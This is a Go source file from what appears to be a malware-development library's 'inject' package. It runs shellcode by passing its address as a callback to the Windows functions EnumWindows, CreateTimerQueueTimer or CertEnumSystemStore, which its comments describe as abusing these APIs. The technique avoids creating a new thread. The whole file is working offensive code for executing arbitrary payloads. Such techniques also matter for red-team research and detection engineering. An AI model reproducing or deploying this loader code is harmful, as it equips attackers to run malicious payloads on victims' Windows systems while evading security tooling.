//go:build windows

package inject

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
)

// CallbackMethod identifies the callback technique used for shellcode execution.
type CallbackMethod int

const (
	// CallbackEnumWindows uses user32.EnumWindows to invoke the shellcode as a
	// window enumeration callback.
	CallbackEnumWindows CallbackMethod = iota

	// CallbackCreateTimerQueue uses kernel32.CreateTimerQueueTimer to invoke
	// the shellcode as a timer callback in the current thread.
	CallbackCreateTimerQueue

	// CallbackCertEnumSystemStore uses crypt32.CertEnumSystemStore to invoke
	// the shellcode as a certificate store enumeration callback.
	CallbackCertEnumSystemStore
)

// String returns the MSDN-style name for the callback method.
func (m CallbackMethod) String() string {
	switch m {
	case CallbackEnumWindows:
		return "EnumWindows"
	case CallbackCreateTimerQueue:
		return "CreateTimerQueueTimer"
	case CallbackCertEnumSystemStore:
		return "CertEnumSystemStore"
	default:
		return "Unknown"
	}
}

// wtExecuteInTimerThread tells CreateTimerQueueTimer to fire the callback
// in the timer thread instead of a worker thread.
const wtExecuteInTimerThread = 0x20

// certSystemStoreCurrentUser is the CERT_SYSTEM_STORE_CURRENT_USER constant.
const certSystemStoreCurrentUser = 0x10000

// ExecuteCallback runs shellcode at addr using the specified callback mechanism.
// No new thread is created -- the callback runs in the current thread context
// (or the timer thread for CreateTimerQueue). The caller must ensure addr
// points to executable memory containing valid shellcode.
func ExecuteCallback(addr uintptr, method CallbackMethod) error {
	if addr == 0 {
		return fmt.Errorf("callback address is zero")
	}

	switch method {
	case CallbackEnumWindows:
		return executeEnumWindows(addr)
	case CallbackCreateTimerQueue:
		return executeTimerQueue(addr)
	case CallbackCertEnumSystemStore:
		return executeCertEnum(addr)
	default:
		return fmt.Errorf("unsupported callback method")
	}
}

// executeEnumWindows abuses EnumWindows: the OS calls addr(hwnd, lParam) for
// each top-level window. Shellcode runs until it returns FALSE (0).
func executeEnumWindows(addr uintptr) error {
	ret, _, err := api.ProcEnumWindows.Call(addr, 0)
	// EnumWindows returns 0 on failure, but our callback intentionally
	// returns 0 to stop enumeration. Only treat as error if the syscall
	// itself failed with a real error code (not ERROR_SUCCESS).
	if ret == 0 && err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("callback execution failed: %w", err)
	}
	return nil
}

// executeTimerQueue abuses CreateTimerQueueTimer with WT_EXECUTEINTIMERTHREAD
// so the callback fires synchronously in the timer thread.
func executeTimerQueue(addr uintptr) error {
	var hTimer uintptr
	ret, _, err := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		0, // default timer queue
		addr,
		0,    // parameter
		0,    // due time (immediate)
		0,    // period (one-shot)
		wtExecuteInTimerThread,
	)
	if ret == 0 {
		return fmt.Errorf("callback execution failed: %w", err)
	}
	// Brief wait to let the timer fire before cleanup.
	api.ProcWaitForSingleObject.Call(uintptr(hTimer), 100)
	return nil
}

// executeCertEnum abuses CertEnumSystemStore: the OS calls addr for each
// certificate store. Shellcode runs as the enumeration callback.
func executeCertEnum(addr uintptr) error {
	// CertEnumSystemStore returns TRUE on success. The callback may cause
	// enumeration to stop early, which is expected.
	api.ProcCertEnumSystemStore.Call(
		certSystemStoreCurrentUser,
		0, // reserved
		0, // pArg
		addr,
	)
	return nil
}
